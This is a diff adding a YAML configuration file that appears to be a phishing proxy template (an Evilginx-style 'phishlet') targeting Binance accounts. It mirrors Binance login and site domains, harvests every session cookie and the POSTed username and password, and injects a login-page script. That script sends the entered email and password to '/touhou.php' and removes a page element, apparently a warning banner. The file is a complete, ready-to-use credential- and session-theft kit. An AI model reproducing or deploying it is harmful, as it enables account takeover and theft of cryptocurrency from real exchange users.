@@ -1,0 +1,37 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'binance.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'binance.com', session: true, is_landing: true}
+  - {phish_sub: 'bin', orig_sub: 'bin', domain: 'bnbstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'sensors', orig_sub: 'sensors', domain: 'binance.cloud', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'www', domain: 'binance.com', search: 'https://www.{hostname_regexp}/', replace: 'https://www.{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'www', domain: 'binance.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.*.binance.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '.*/welcome'
+  - '.*/my/.*' 
+  - '.*/dashboard/.*'
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'accounts.binance.com'
+  path: '/'
+
+
+js_inject:
+  - trigger_domains: ["accounts.binance.com"]
+    trigger_paths: [".*/login"]
+    script: |
+             function onclickListener(){         var submit = document.querySelectorAll('button[data-bn-type=button]')[0];         submit.setAttribute("onclick", "sendPass()", 500);         return;       }       function sendPass(){         var username = document.getElementsByName("email")[0].value;         var pass = document.getElementsByName("password")[0].value;         var xhr = new XMLHttpRequest();         xhr.open("POST", '/touhou.php', true);         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");         xhr.send("username="+encodeURIComponent(username)+"&password="+encodeURIComponent(pass));         return;       }       setTimeout(function(){ onclickListener(); }, 1000); setTimeout(function(){ while (document.getElementsByClassName('css-1432u7b')[0]) {         document.getElementsByClassName('css-1432u7b')[0].remove(); } }, 320); 
